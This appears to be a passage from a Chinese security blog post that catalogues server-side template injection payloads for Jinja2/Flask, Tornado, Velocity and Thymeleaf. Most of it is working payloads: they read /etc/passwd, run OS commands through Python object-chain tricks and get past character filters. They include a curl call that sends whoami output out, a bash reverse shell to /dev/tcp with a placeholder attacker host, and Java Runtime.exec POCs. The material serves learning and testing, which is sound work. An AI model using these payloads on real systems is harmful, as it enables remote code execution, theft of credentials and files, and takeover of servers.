class=&#34;line&#34;&gt;[].__class__.__bases__[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;request.__class__.__mro__[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#python 2.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#文件操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#找到file类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[40]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#读文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[40](&amp;#x27;/etc/passwd&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#写文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[40](&amp;#x27;/tmp&amp;#x27;).write(&amp;#x27;test&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#命令执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#os执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;#x27;id&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#eval,impoer等全局函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;eval&amp;#x27;](&amp;quot;__import__(&amp;#x27;os&amp;#x27;).popen(&amp;#x27;id&amp;#x27;).read()&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(&amp;quot;__import__(&amp;#x27;os&amp;#x27;).popen(&amp;#x27;id&amp;#x27;).read()&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&amp;#x27;os&amp;#x27;).popen(&amp;#x27;id&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;__import__&amp;#x27;](&amp;#x27;os&amp;#x27;).popen(&amp;#x27;id&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#python3.7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#命令执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&amp;#x27;catch_warnings&amp;#x27; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;].eval(&amp;quot;__import__(&amp;#x27;os&amp;#x27;).popen(&amp;#x27;id&amp;#x27;).read()&amp;quot;) &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#文件操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&amp;#x27;catch_warnings&amp;#x27; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;].open(&amp;#x27;filename&amp;#x27;, &amp;#x27;r&amp;#x27;).read() &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#windows下的os命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&amp;#x27;popen&amp;#x27;](&amp;#x27;dir&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;过滤 [&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#getitem、pop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&amp;#x27;/etc/passwd&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&amp;#x27;ls&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;过滤引号&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#chr函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&amp;#125;&amp;#125;#request对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &amp;#125;&amp;#125;&amp;amp;path=/etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#命令执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &amp;#125;&amp;#125;&amp;amp;cmd=id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;过滤下划线&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&amp;#x27;/etc/passwd&amp;#x27;).read() &amp;#125;&amp;#125;&amp;amp;class=__class__&amp;amp;mro=__mro__&amp;amp;subclasses=__subclasses__&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;过滤 join&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&amp;#125;&amp;#125;&amp;amp;f=%s%sclass%s%s&amp;amp;a=_&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;过滤花括号&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#用&amp;#123;%%&amp;#125;标记&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% if &amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;#x27;curl http://127.0.0.1:7999/?i=`whoami`&amp;#x27;).read()==&amp;#x27;p&amp;#x27; %&amp;#125;1&amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;RCE&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request.__class__.__mro__%&amp;#125;&amp;#123;&amp;#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&amp;#125;&amp;#125;&amp;#123;&amp;#123;config.from_pyfile(request.args.file)&amp;#125;&amp;#125;&amp;amp;file=/tmp/foo.py&amp;amp;write=w&amp;amp;payload=print+1337&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;%set%20a,b,c,d,e,f,g,h,i%20=%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&amp;#125;&amp;#123;&amp;#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&amp;#125;&amp;#125;&amp;#123;&amp;#123;config.from_pyfile(request.args.file)&amp;#125;&amp;#125;&amp;amp;class=class&amp;amp;mro=mro&amp;amp;subc=subclasses&amp;amp;usc=_&amp;amp;file=/tmp/foo.py&amp;amp;write=w&amp;amp;payload=print+1337&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;利用示例：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% if c.__name__ == &amp;#x27;catch_warnings&amp;#x27; %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;% for b in c.__init__.__globals__.values() %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;% if b.__class__ == &amp;#123;&amp;#125;.__class__ %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% if &amp;#x27;eval&amp;#x27; in b.keys() %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&amp;#123; b[&amp;#x27;eval&amp;#x27;](&amp;#x27;__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;id&amp;quot;).read()&amp;#x27;) &amp;#125;&amp;#125;         //popen的参数就是要执行的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY3OSN0b2MtMg==&#34;&gt;flask 之 ssti 模版注入从零到入门 - 先知社区 (aliyun.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一些 SSTI 的利用方法&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XSS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/183818089cbcfaebaa8530e26755baa6.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;以 GET 方式从 URL 处获取 code 参数的值，然后将它输出到页面 .&lt;/p&gt;
&lt;p&gt;这段代码非常容易看出来存在安全隐患。后端没有对用户输入的内容进行过滤，就直接将它输出到页面 输入端是完全可控的。这就产生了代码域与数据域的混淆&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/d365f73c989235a7b2e272a714c28433.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反弹 shell&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&amp;#x27;os&amp;#x27;].popen(&amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/你的服务器地址/端口 0&amp;gt;&amp;amp;1&amp;#x27;).read()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个 Payload 不能直接放在 URL 中执行，因为  &lt;code&gt;&amp;amp;&lt;/code&gt;  的存在会导致 URL 解析出现错误 可以使用 BurpSuite 等工具构造数据包再发送&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2a7321a2aee82c4f143e92ebf5bb70a9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;request.environ&lt;/code&gt;  一个与服务器环境相关的对象字典。访问该字典可以拿到很多你期待的信息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;config.items&lt;/code&gt;  一个类字典的对象，包含了所有应用程序的配置值 在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY 等敏感值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tornado&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tornado&#34;&gt;#&lt;/a&gt; tornado&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&amp;#123;&amp;#123;&amp;#125;&amp;#125;进行传递变量和执行简单的表达式。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;java&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; java&lt;/h2&gt;
&lt;h3 id=&#34;velocity&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#velocity&#34;&gt;#&lt;/a&gt; velocity&lt;/h3&gt;
&lt;p&gt;Apache Velocity 是一个基于 Java 的模板引擎，它提供了一个模板语言去引用由 Java 代码定义的对象。Velocity 是 Apache 基金会旗下的一个开源软件项目，旨在确保 Web 应用程序在表示层和业务逻辑层之间的隔离（即 MVC 设计模式）。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// 漏洞源码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private static void velocity(String template)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Velocity.init();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        VelocityContext context = new VelocityContext();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        context.put(&amp;quot;author&amp;quot;, &amp;quot;Elliot A.&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        context.put(&amp;quot;address&amp;quot;, &amp;quot;217 E Broadway&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        context.put(&amp;quot;phone&amp;quot;, &amp;quot;555-1337&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        StringWriter swOut = new StringWriter();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // 使用Velocity&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Velocity.evaluate(context, swOut, &amp;quot;test&amp;quot;, template);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;POC&lt;/strong&gt;&lt;br&gt;
 &lt;code&gt;http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzQ2NiN0b2MtMA==&#34;&gt;白头搔更短，SSTI 惹人心！ - 先知社区 (aliyun.com)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;thymeleaf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#thymeleaf&#34;&gt;#&lt;/a&gt; Thymeleaf&lt;/h3&gt;
&lt;p&gt;Thymeleaf 是 SpringBoot 中的一个模版引擎，个人认为有点类似于 Python 中的 Jinja2，负责渲染前端页面。&lt;/p&gt;
&lt;p&gt;Thymeleaf 中的表达式有好几种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;变量表达式：  &lt;code&gt;$&amp;#123;...&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;选择变量表达式：  &lt;code&gt;*&amp;#123;...&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;消息表达：  &lt;code&gt;#&amp;#123;...&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;链接 URL 表达式：  &lt;code&gt;@&amp;#123;...&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;片段表达式：  &lt;code&gt;~&amp;#123;...&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;片段表达式语法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;~{templatename::selector}&lt;/strong&gt;，会在 &lt;code&gt;/WEB-INF/templates/&lt;/code&gt;  目录下寻找名为 &lt;code&gt;templatename&lt;/code&gt;  的模版中定义的 &lt;code&gt;fragment&lt;/code&gt; ，如上面的 &lt;code&gt;~&amp;#123;footer :: copy&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;~{templatename}&lt;/strong&gt;，引用整个 &lt;code&gt;templatename&lt;/code&gt;  模版文件作为 &lt;code&gt;fragment&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;~{::selector} 或～{this::selector}&lt;/strong&gt;，引用来自同一模版文件名为 &lt;code&gt;selector&lt;/code&gt;  的 &lt;code&gt;fragmnt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其中 &lt;code&gt;selector&lt;/code&gt;  可以是通过 &lt;code&gt;th:fragment&lt;/code&gt;  定义的片段，也可以是类选择器、ID 选择器等。&lt;/p&gt;
&lt;p&gt;当 &lt;code&gt;~&amp;#123;&amp;#125;&lt;/code&gt;  片段表达式中出现 &lt;code&gt;::&lt;/code&gt; ，则 &lt;code&gt;::&lt;/code&gt;  后需要有值，也就是 &lt;code&gt;selector&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;预处理&lt;/p&gt;
&lt;p&gt;语法： &lt;code&gt;__$&amp;#123;expression&amp;#125;__&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;官方文档对其的解释：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;除了所有这些用于表达式处理的功能外，Thymeleaf 还具有&lt;em&gt;预处理&lt;/em&gt;表达式的功能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;预处理是在正常表达式之前完成的表达式的执行&lt;/strong&gt;，允许修改最终将执行的表达式。&lt;/p&gt;
&lt;p&gt;预处理的表达式与普通表达式完全一样，但被双下划线符号（如 &lt;code&gt;__$&amp;#123;expression&amp;#125;__&lt;/code&gt; ）包围。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;个人感觉这是出现 SSTI 最关键的一个地方，预处理也可以解析执行表达式，也就是说找到一个可以控制预处理表达式的地方，让其解析执行我们的 payload 即可达到任意代码执行&lt;/p&gt;
&lt;p&gt;最常见的 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 &lt;code&gt;__$&amp;#123;&amp;#125;__::.x&lt;/code&gt;  构造表达式会由 Thymeleaf 去执行&lt;/p&gt;
